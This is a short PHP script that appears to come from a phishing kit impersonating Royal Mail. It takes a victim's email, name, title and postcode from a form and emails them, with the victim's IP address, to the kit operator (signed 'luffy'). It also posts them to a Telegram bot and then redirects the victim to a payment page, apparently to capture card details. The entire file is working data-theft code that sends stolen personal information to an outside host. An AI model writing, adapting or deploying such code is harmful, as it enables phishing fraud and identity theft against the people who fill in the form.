<?php
error_reporting(0);
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
include "../../email.php";


$ip = getenv("REMOTE_ADDR");
$message = "\n";
$message = "[===== ♠️ ⚡ Royalmail RZLT(Info) ⚡ ♠️ =====]\r\n";
$message .= "|Email      : ".$_POST['email']."\r\n";
$message .= "|Title      : ".$_POST['title']."\r\n";
$message .= "|First name : ".$_POST['name1']."\r\n";
$message .= "|last name  : ".$_POST['name2']."\r\n";
$message .= "|Postcode   : ".$_POST['name3']."\r\n";
$message .= "----------- | By luffy | -----------\n";
$message .= "\n";
include "../../bots/html-5.php";
$send = $email;
$subject = "| royalmail Log By luffy | $ip |";
mail($send,$subject,$message);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

header('Location: ../pay.html');

?>
